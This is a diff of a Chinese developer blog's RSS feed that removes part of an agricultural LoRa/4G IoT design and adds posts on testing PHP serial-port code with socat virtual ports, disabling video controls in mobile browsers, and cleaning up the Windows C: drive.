-&lt;li&gt;4G 网络模块：将接收到的数据上传到 MOTT 服务器。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;3.3 应用软件原型图（电脑端或手机端）&lt;/b&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 登录界面                                               |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 用户名输入框                                        |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 密码输入框                                          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 登录按钮                                            |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;| 主界面                                                 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 实时显示温湿度、光照度、风扇状态、手动/自动模式   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 手动控制按钮 (启动/停止风扇)                       |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 自动模式阈值设置 (温度、光照度)                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   - 状态显示：当前模式（手动/自动）、风扇状态（开/关）|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+-------------------------------------------------------+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h4 id=&#34;4-系统设计步骤&#34;&gt;&lt;a href=&#34;#4-系统设计步骤&#34; class=&#34;headerlink&#34; title=&#34;4. 系统设计步骤&#34;&gt;&lt;/a&gt;&lt;b&gt;4. 系统设计步骤&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;&lt;b&gt;4.1 硬件设计与开发&lt;/b&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;选择适当的传感器：温湿度传感器（如 DHT22）、光照度传感器、风扇控制模块、LED 指示灯、蜂鸣器。&lt;/li&gt;
-&lt;li&gt;智能节点电路设计：设计电源管理电路，确保所有传感器和控制组件能正常工作。&lt;/li&gt;
-&lt;li&gt;LoRa 模块集成：将 LoRa 模块集成到智能节点中，实现数据的无线传输。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;4.2 软件开发&lt;/b&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;智能节点程序：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;编写代码获取传感器数据。&lt;/li&gt;
-&lt;li&gt;控制风扇及 LED 指示灯。&lt;/li&gt;
-&lt;li&gt;实现手动与自动模式的切换。&lt;/li&gt;
-&lt;li&gt;实现 LoRa 数据发送功能。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;ul&gt;
-&lt;li&gt;4G 网关节点程序：&lt;ul&gt;
-&lt;li&gt;接收 LoRa 数据并通过 4G 网络上传至 MOTT 服务器。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;MOTT 服务器开发：&lt;ul&gt;
-&lt;li&gt;提供数据存储和远程管理接口（API）。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;应用软件开发：&lt;ul&gt;
-&lt;li&gt;实现用户登录、手动控制、自动控制、数据展示等功能。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;4.3 系统集成与测试&lt;/b&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;硬件集成：将传感器、LoRa 模块、显示屏等硬件连接至智能节点和 4G 网关节点。&lt;/li&gt;
-&lt;li&gt;功能测试：测试手动模式、自动模式、数据传输功能等。&lt;/li&gt;
-&lt;li&gt;性能优化：确保系统在实时数据传输和控制中的稳定性。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;b&gt;4.4 部署与维护&lt;/b&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;部署智能节点和 4G 网关：将系统部署到实际农业环境中，进行现场测试和调试。&lt;/li&gt;
-&lt;li&gt;维护与更新：定期检查系统，进行必要的功能更新和优化。&lt;/li&gt;
-&lt;/ul&gt;
+&lt;h2 id=&#34;那么这时候需要测试一下代码。那总不能真的找个串口设备吧，然而虚拟串口真香。&#34;&gt;&lt;a href=&#34;#那么这时候需要测试一下代码。那总不能真的找个串口设备吧，然而虚拟串口真香。&#34; class=&#34;headerlink&#34; title=&#34;那么这时候需要测试一下代码。那总不能真的找个串口设备吧，然而虚拟串口真香。&#34;&gt;&lt;/a&gt;那么这时候需要测试一下代码。那总不能真的找个串口设备吧，然而虚拟串口真香。&lt;/h2&gt;&lt;h3 id=&#34;5-在Linux中使用-socat-模拟虚拟串口&#34;&gt;&lt;a href=&#34;#5-在Linux中使用-socat-模拟虚拟串口&#34; class=&#34;headerlink&#34; title=&#34;5.在Linux中使用 socat 模拟虚拟串口&#34;&gt;&lt;/a&gt;5.在Linux中使用 socat 模拟虚拟串口&lt;/h3&gt;&lt;p&gt;socat 是一个强大的工具，可以创建虚拟串口对。&lt;/p&gt;
+&lt;p&gt;安装 socat：&lt;br&gt;在Debian/Ubuntu系统上：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install socat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;创建虚拟串口对：&lt;br&gt;运行以下命令创建一对虚拟串口：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;socat -d -d pty,raw,echo=0 pty,raw,echo=0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;运行后如图：&lt;br&gt;&lt;img src=&#34;/img/2024/20250103151316.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;br&gt;这样可以看到出现两个虚拟串口。&lt;br&gt;把上面的php代码放到文件中运行一下:&lt;br&gt;&lt;img src=&#34;/img/2024/20250103151620.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
+&lt;p&gt;同时新开个窗口执行：&lt;code&gt;cat /dev/pts/5&lt;/code&gt;来读取串口数据。&lt;br&gt;如下图：&lt;br&gt;&lt;img src=&#34;/img/2024/20250103151927.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里是发送数据，那接收数据怎么看呢。&lt;br&gt;那就在代码上改造一下加个for：&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 从串口读取数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$data = dio_read($fd, 1024); // 读取最多 1024 字节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;已接收: $data\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;这里改造主要是测试用，实际上不需要。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//测试接收&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for($i=0;$i&amp;lt;20;$i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sleep(3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 从串口读取数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$data = dio_read($fd, 1024); // 读取最多 1024 字节&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;已接收: $data\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;那么，再次运行php代码,然后在新窗口运行&lt;code&gt;echo &amp;quot;欢迎你出生在https://erik.xyz&amp;quot; &amp;gt; /dev/pts/5&lt;/code&gt;来发送信息，你会看到如图的接收：&lt;br&gt;&lt;img src=&#34;/img/2024/20250103152421.png&#34; alt=&#34;https://erik.xyz&#34;&gt;&lt;/p&gt;
+&lt;p&gt;到这里，发送和接收串口已经好了。&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -875,6 +729,24 @@
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">https://erik.xyz/2024/10/23/rohibit-video-playback/</guid>
+            <title>在手机浏览器中禁止播放视频、暂停、快进等操作</title>
+            <link>https://erik.xyz/2024/10/23/rohibit-video-playback/</link>
+            <category>浏览器禁止操作视频</category>
+            <category>禁止视频</category>
+            <pubDate>Wed, 23 Oct 2024 20:27:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;b&gt;1. 禁止暂停、快进等操作&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;可以通过将 controls 属性从 &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;元素中移除，防止用户通过控制条进行操作。然后通过 JavaScript 强制控制视频播放的状态，不允许用户暂停或快进。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;video id=&amp;quot;myVideo&amp;quot; width=&amp;quot;100%&amp;quot; autoplay loop&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;source src=&amp;quot;your-video.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Your browser does not support the video tag.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/video&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var video = document.getElementById(&amp;quot;myVideo&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 禁止暂停、快进等操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  video.controls = false; // 禁用控件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  video.play(); // 强制播放&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 监听时间更新事件，确保视频不被暂停或快进&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  video.addEventListener(&amp;#x27;play&amp;#x27;, function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    video.currentTime = 0; // 重置视频时间，避免用户快进&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  video.addEventListener(&amp;#x27;seeked&amp;#x27;, function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    video.currentTime = 0; // 重置视频时间，避免用户跳跃&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  // 监听点击暂停等操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  video.addEventListener(&amp;#x27;pause&amp;#x27;, function() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    video.play(); // 禁止暂停&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;&lt;b&gt;2. 使用 pointer-events 禁止点击操作&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;你还可以通过 CSS 来禁止用户与视频控件进行交互。通过 pointer-events: none; 可以使用户无法点击视频，进而禁止播放、暂停等交互操作。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;video id=&amp;quot;myVideo&amp;quot; width=&amp;quot;100%&amp;quot; autoplay loop&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;source src=&amp;quot;your-video.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Your browser does not support the video tag.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/video&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  #myVideo &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pointer-events: none; /* 禁止用户交互 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;b&gt;3. 禁止视频控制条显示&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;一些手机浏览器会自动显示视频控制条。为了禁止这种行为，可以通过 CSS 控制：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;video id=&amp;quot;myVideo&amp;quot; width=&amp;quot;100%&amp;quot; autoplay loop&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;source src=&amp;quot;your-video.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Your browser does not support the video tag.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/video&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  #myVideo::-webkit-media-controls &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    display: none !important; /* Safari/iOS */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  #myVideo::-moz-media-controls &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    display: none !important; /* Firefox */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  #myVideo::-ms-media-controls &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    display: none !important; /* IE/Edge */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/style&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;b&gt;4. 完全阻止用户与视频交互&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;通过将视频元素设置为全屏，或者完全覆盖在视频上的透明层也可以实现禁止用户与视频交互的效果。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;video id=&amp;quot;myVideo&amp;quot; width=&amp;quot;100%&amp;quot; autoplay loop&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;source src=&amp;quot;your-video.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Your browser does not support the video tag.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/video&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div id=&amp;quot;overlay&amp;quot; style=&amp;quot;position:absolute; top:0; left:0; width:100%; height:100%; background: rgba(255, 255, 255, 0); pointer-events: all;&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">https://erik.xyz/2024/09/22/internet-practice/</guid>
             <title>史上最详细的互联网项目管理实战图解</title>
             <link>https://erik.xyz/2024/09/22/internet-practice/</link>
@@ -905,6 +777,88 @@
 &lt;li&gt;保持项目进展的透明，定期向所有相关方汇报进度，这样可以建立信任并减少误解。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/kv0BAmE6ASll9eZjvlZImQ&#34;&gt;PMO前沿&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://erik.xyz/2024/08/23/disk-cleanup/</guid>
+            <title>清理c盘</title>
+            <link>https://erik.xyz/2024/08/23/disk-cleanup/</link>
+            <category>清理系统</category>
+            <category>清理c盘</category>
+            <pubDate>Fri, 23 Aug 2024 22:37:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;b&gt;1. 使用磁盘清理工具&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;Windows 10自带了一个磁盘清理工具，可以用来删除临时文件、系统文件和其他不必要的文件。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打开磁盘清理工具：&lt;ul&gt;
+&lt;li&gt;点击开始菜单，输入“磁盘清理”，并选择搜索结果中的“磁盘清理”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;选择要清理的驱动器：&lt;ul&gt;
+&lt;li&gt;在弹出的窗口中，选择C盘（通常为系统盘），然后点击“确定”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;选择要删除的文件类型：&lt;ul&gt;
+&lt;li&gt;在磁盘清理窗口中，系统会列出可以删除的文件类型（如临时文件、系统缓存、回收站等）。你可以选择你想清理的文件类型。&lt;br&gt;点击“清理系统文件”按钮，允许清理更多系统文件（如Windows更新文件）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;确认删除：&lt;ul&gt;
+&lt;li&gt;点击“确定”后，系统将开始清理这些文件，清理完成后C盘的空间将得到释放。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;b&gt;2. 删除临时文件&lt;/b&gt;&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;Windows 10允许你直接删除临时文件，这些文件可能积累过多，占用大量空间。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打开“设置”应用，选择系统 &amp;gt; 存储。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;在“本地磁盘 (C:)”下，点击临时文件。&lt;/li&gt;
